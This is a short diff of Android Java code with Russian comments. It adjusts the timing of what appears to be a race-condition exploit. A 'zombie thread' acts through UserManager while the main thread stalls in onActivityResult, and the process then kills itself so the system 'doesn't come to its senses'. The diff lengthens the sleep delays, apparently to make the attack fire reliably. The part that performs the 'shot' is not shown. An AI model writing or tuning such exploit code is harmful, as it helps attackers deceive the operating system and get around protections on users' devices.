@@ -170,7 +170,7 @@ protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         // 1. Создаем "зомби-поток" с максимальным приоритетом
         Thread zombie = new Thread(() -> {
             // Даем UI-потоку войти в состояние заморозки
-            try { Thread.sleep(200); } catch (InterruptedException ignored) {}
+            try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
 
             Context app = getApplicationContext();
             UserManager um = (UserManager) app.getSystemService(Context.USER_SERVICE);
@@ -188,7 +188,7 @@ protected void onActivityResult(int requestCode, int resultCode, Intent data) {
                     break;
                 }
             }
-            
+            try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
             // После выстрела принудительно гасим весь процесс, чтобы система не опомнилась
             android.os.Process.killProcess(android.os.Process.myPid());
         });
@@ -200,7 +200,7 @@ protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         // Мы входим в бесконечный цикл или долгий сон прямо в Main Thread
         // Система думает, что мы еще обрабатываем результат, а зомби-поток уже делает свое дело
         try {
-            Thread.sleep(5000); 
+            Thread.sleep(50000); 
         } catch (InterruptedException ignored) {}
     }
 }
